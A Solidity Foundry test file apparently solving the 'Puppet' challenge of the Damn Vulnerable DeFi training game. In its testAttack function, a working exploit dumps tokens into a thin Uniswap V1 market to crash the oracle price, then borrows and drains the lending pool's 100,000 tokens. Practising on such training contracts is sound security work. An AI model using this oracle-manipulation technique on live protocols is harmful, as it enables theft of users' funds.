// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";

interface UniswapV1Exchange {
    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline)
        external
        payable
        returns (uint256);

    function balanceOf(address _owner) external view returns (uint256);

    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);

    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256);
}

interface UniswapV1Factory {
    function initializeFactory(address template) external;

    function createExchange(address token) external returns (address);
}

contract PuppetPoolTest is Test {
    DamnValuableToken private dvt;
    PuppetPool private pool;
    UniswapV1Exchange private uniswapV1ExchangeTemplate;
    UniswapV1Exchange private uniswapExchange;
    UniswapV1Factory private uniswapV1Factory;
    address private player;
    uint256 private constant UNISWAP_INITIAL_TOKEN_RESERVE = 10 ether;
    uint256 private constant UNISWAP_INITIAL_ETH_RESERVE = 10 ether;
    uint256 private constant PLAYER_INITIAL_TOKEN_BALANCE = 1000 ether;
    uint256 private constant PLAYER_INITIAL_ETH_BALANCE = 25 ether;
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 100_000 ether;
    uint256 internal constant DEADLINE = 10_000_000;

    function setUp() public {
        dvt = new DamnValuableToken();

        player = makeAddr("player");
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        dvt.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);

        uniswapV1Factory = UniswapV1Factory(deployCode("./src/build-uniswap/v1/UniswapV1Factory.json"));
        uniswapV1ExchangeTemplate = UniswapV1Exchange(deployCode("./src/build-uniswap/v1/UniswapV1Exchange.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));
        uniswapExchange = UniswapV1Exchange(uniswapV1Factory.createExchange(address(dvt)));

        pool = new PuppetPool(address(dvt), address(uniswapExchange));

        dvt.approve(address(uniswapExchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapExchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(0, UNISWAP_INITIAL_TOKEN_RESERVE, DEADLINE);
        assertEq(
            uniswapExchange.getTokenToEthInputPrice(1 ether),
            calculateTokenToEthInputPrice(1 ether, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        );
        dvt.transfer(address(pool), POOL_INITIAL_TOKEN_BALANCE);

        assertEq(pool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE), POOL_INITIAL_TOKEN_BALANCE * 2);
    }

    function testAttack() public {
        // Exploit code:
        vm.startPrank(player);
        dvt.approve(address(uniswapExchange), PLAYER_INITIAL_TOKEN_BALANCE);
        uint256 bought = uniswapExchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1, DEADLINE);
        pool.borrow{value: PLAYER_INITIAL_ETH_BALANCE + bought}(POOL_INITIAL_TOKEN_BALANCE, player);
        vm.stopPrank();
        //
        validate();
    }

    function validate() public {
        assertGe(dvt.balanceOf(player), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(pool)), 0);
    }

    function calculateTokenToEthInputPrice(uint256 input_amount, uint256 input_reserve, uint256 output_reserve)
        internal
        returns (uint256)
    {
        uint256 input_amount_with_fee = input_amount * 997;
        uint256 numerator = input_amount_with_fee * output_reserve;
        uint256 denominator = (input_reserve * 1000) + input_amount_with_fee;
        return numerator / denominator;
    }
}
